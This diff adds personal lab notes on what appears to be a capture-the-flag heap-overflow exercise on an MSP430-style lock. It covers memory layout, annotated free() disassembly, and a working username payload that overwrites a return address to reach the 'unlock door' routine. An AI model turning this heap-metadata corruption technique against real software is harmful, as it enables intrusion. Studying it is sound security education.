@@ -1,0 +1,63 @@
+- Heap based overflows this time.
+- Unlock door already has 7f, means I just need to call it and the door will open. unlock door is at 4564.
+- 48 chars input max. getsn() is at 4668 and again at 4682.
+- 2 mallocs of static text already done - 16 bytes each. Total of 32 bytes so far. Starting at 240e.
+- Username storage starts at 240e.
+- Password storage starts at 2424.
+- Return address that must be overwritten is at 4440. Need to change 4440 to 4564.
+- Also, for the first time memory is not copied onto the stack? It's all in the heap.
+- 1 additional character in the username causes a "load address unaligned" error 45..wonder why 45.
+- Hmm. I enter 41 it says error on 45. I enter 43 it says error on 47. If I enter 42 it goes through. Weird.
+- The return address is on the stack, I'm only inside the heap so I'm not going to be able to reach the return address .. I think. Have to do something on the heap.
+
+- Hmm article talks about non-control data attacks. Maybe overwrite something that looks safe. Dunno what just yet.
+	https://www.sans.org/reading-room/whitepapers/threats/buffer-overflows-dummies-481
+
+This eventually worked - I could overwrite ret with a memory address 2422. Code jumped there after the 2nd free. There was a little dummy data that I pushed after 2224 (ret overwrite) and 9a43 to keep the code from crashing. The dummy code is 30127f00b012. Of this 7f00 and b012 get overwritten but its just dumped on to the stack. Eventually it gets to 30127f00b012b646 which is the code for unlock door.
+
+Username - 4141414141414141414141414141414122249a4330127f00b01230127f00b012b646
+Password - 44
+
+-- This works and causes an insn address unaligned but for some reason it's overwriting the address of the function to be called as wel - in this case "unlock door".
+-- The free() call at 46a4 causes the return address to be overwritten. But it also overwrites unlock door :( :(. Have to RTFM so
+-- Can't overwrite within the free() call. Causes a crash and an insn address unaligned.
+-- 4 bytes are written.
+-- Whenever I try and write inside the program .. to say 4688, it doesn't set ret there but to some location in memory. Why?
+
+Unlock door assembly - 
+4564:  3012 7f00      push	#0x7f
+4568:  b012 b646      call	#0x46b6 <INT>
+456c:  2153           incd	sp
+456e:  3041           ret
+-----------
+
+
+Free assembly -
+4508:  0b12           push	r11			NA
+450a:  3f50 faff      add	#0xfffa, r15		Counts 16 bytes and jumps to the address of byte 17
+450e:  1d4f 0400      mov	0x4(r15), r13		Goes forward 4 more bytes and copies to r13. This can be user controlled. - A
+4512:  3df0 feff      and	#0xfffe, r13		NA (For now)
+4516:  8f4d 0400      mov	r13, 0x4(r15)		NA (For now)
+451a:  2e4f           mov	@r15, r14		Move contents of byte 17(a1) into r14. 16 bytes is normal. Anything more is a problem.
+451c:  1c4e 0400      mov	0x4(r14), r12		Move contents of a1+4 into r12. Some operation on a1+4.
+4520:  1cb3           bit	#0x1, r12
+4522:  0d20           jnz	#0x453e <free+0x36>	Some math to calculate stuff. Probably want to jump over this somehow. Maybe. - B
+4524:  3c50 0600      add	#0x6, r12		Math - do later
+4528:  0c5d           add	r13, r12		Math - do later
+452a:  8e4c 0400      mov	r12, 0x4(r14)		A little math and a new value(a2) is pushed back to a1+4. Hmm. 
+452e:  9e4f 0200 0200 mov	0x2(r15), 0x2(r14)	Move ret of main to unlockdoor function to a1+2.
+4534:  1d4f 0200      mov	0x2(r15), r13		Move ret of main to r13
+4538:  8d4e 0000      mov	r14, 0x0(r13)		This actually does the overwriting of ret correctly. This code MUST run.
+453c:  2f4f           mov	@r15, r15		unlock door address into r15
+453e:  1e4f 0200      mov	0x2(r15), r14		ret of main into r14
+4542:  1d4e 0400      mov	0x4(r14), r13		
+4546:  1db3           bit	#0x1, r13
+4548:  0b20           jnz	#0x4560 <free+0x58>
+454a:  1d5f 0400      add	0x4(r15), r13
+454e:  3d50 0600      add	#0x6, r13
+4552:  8f4d 0400      mov	r13, 0x4(r15)
+4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)	More messing with the content of the unlockdoor function. We don't want to go here either.
+455c:  8e4f 0000      mov	r15, 0x0(r14)
+4560:  3b41           pop	r11			NA
+4562:  3041           ret				NA
+
